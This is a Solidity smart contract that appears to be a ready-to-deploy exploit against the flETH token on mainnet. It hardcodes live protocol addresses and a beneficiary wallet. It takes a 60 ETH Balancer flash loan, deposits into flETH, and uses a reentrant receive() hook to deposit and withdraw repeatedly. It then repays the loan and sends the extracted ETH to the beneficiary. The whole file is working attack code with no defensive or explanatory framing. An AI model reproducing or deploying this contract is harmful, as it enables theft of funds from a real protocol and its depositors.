// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IFLETHStrategy {
    function balanceInETH() external view returns (uint256);
}

interface IFLETH {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function deposit(uint256 wethAmount) external payable;
    function withdraw(uint256 amount) external;
    function strategy() external view returns (IFLETHStrategy);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract FlETHAttackerMainnet {
    IFLETH public constant flETH = IFLETH(0x000000000D564D5be76f7f0d28fE52605afC7Cf8);
    IBalancerVault public constant balancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH public constant WETH = IWETH(0x4200000000000000000000000000000000000006);

    address public constant BENEFICIARY = 0x161B2CA2f65a4b8bfd4317569b2Fc386CFB2A1A0;

    uint256 public constant FLASHLOAN_AMOUNT = 60 ether;
    uint256 public constant MAX_REENTRANCY_DEPTH = 5;

    address public immutable deployer;
    bool public attackExecuted;
    bool private attacking;
    uint256 private reentrancyCount;
    uint256 public totalExtracted;
    uint256 public netProfit;

    event AttackStarted(uint256 flashloanAmount, address indexed beneficiary);
    event ReentrancyCycle(uint256 cycle, uint256 received, uint256 cumulative);
    event AttackCompleted(uint256 totalExtracted, uint256 netProfit);

    modifier onlyDeployer() {
        require(msg.sender == deployer, "Only deployer");
        _;
    }

    modifier notExecuted() {
        require(!attackExecuted, "Attack already executed");
        _;
    }

    constructor() {
        deployer = msg.sender;
    }

    function executeAttack() external onlyDeployer notExecuted {
        attackExecuted = true;
        emit AttackStarted(FLASHLOAN_AMOUNT, BENEFICIARY);

        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASHLOAN_AMOUNT;

        balancerVault.flashLoan(
            address(this),
            tokens,
            amounts,
            ""
        );
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        require(msg.sender == address(balancerVault), "Only Balancer");
        require(tokens[0] == address(WETH), "Wrong asset");
        require(feeAmounts[0] == 0, "Expected 0% fee");

        uint256 flashAmount = amounts[0];

        // Unwrap WETH -> ETH
        WETH.withdraw(flashAmount);

        // Reset counters
        reentrancyCount = 0;
        totalExtracted = 0;

        // FLOW DE LA TRACE:
        // 1. Deposit ~90.75% du flashloan
        //    Cela force le transfert vers Strategy
        uint256 depositAmount = (flashAmount * 9075) / 10000; // 90.75%

        flETH.deposit{value: depositAmount}(0);
        uint256 flETHBalance = flETH.balanceOf(address(this));

        // 2. Withdraw tout pour déclencher réentrance
        attacking = true;
        flETH.withdraw(flETHBalance);
        attacking = false;

        // 3. Calculer résultats
        uint256 finalBalance = address(this).balance;

        if (finalBalance >= flashAmount) {
            netProfit = finalBalance - flashAmount;
        } else {
            netProfit = 0;
        }

        emit AttackCompleted(totalExtracted, netProfit);

        // 4. Rembourser flashloan
        WETH.deposit{value: flashAmount}();
        require(WETH.transfer(address(balancerVault), flashAmount), "WETH transfer failed");
    }

    receive() external payable {
        if (!attacking) {
            return;
        }

        reentrancyCount++;
        totalExtracted += msg.value;

        emit ReentrancyCycle(reentrancyCount, msg.value, totalExtracted);

        // STRATÉGIE DE RÉENTRANCE DE LA TRACE:
        // - Cycle 1: Reçoit 54.45 ETH (le deposit initial)
        // - Cycle 2-5: Divise par 2 à chaque fois (50% re-deposit)
        //
        // À chaque cycle:
        // 1. Re-deposit 50% du reçu
        // 2. Withdraw immédiatement tout flETH
        // 3. Cela force flETH <-> Strategy à échanger des ETH

        if (reentrancyCount >= MAX_REENTRANCY_DEPTH) {
            return; // Arrêter la réentrance
        }

        // Re-déposer 50% du montant reçu
        uint256 reDepositAmount = msg.value / 2;

        if (reDepositAmount > 0) {
            flETH.deposit{value: reDepositAmount}(0);
            uint256 flETHMinted = flETH.balanceOf(address(this));

            // Re-withdraw immédiatement
            if (flETHMinted > 0) {
                flETH.withdraw(flETHMinted);
            }
        }
    }

    fallback() external payable {
        // Recevoir ETH
    }

    function checkSystemState() external view returns (
        uint256 flETHDirectBalance,
        uint256 strategyBalance,
        uint256 flETHTotalSupply,
        uint256 ourBalance
    ) {
        flETHDirectBalance = address(flETH).balance;
        strategyBalance = flETH.strategy().balanceInETH();
        flETHTotalSupply = flETH.totalSupply();
        ourBalance = address(this).balance;
    }

    function withdrawProfit() external onlyDeployer {
        uint256 balance = address(this).balance;
        require(balance > 0, "No profit to withdraw");

        (bool success,) = BENEFICIARY.call{value: balance}("");
        require(success, "Transfer failed");
    }
}
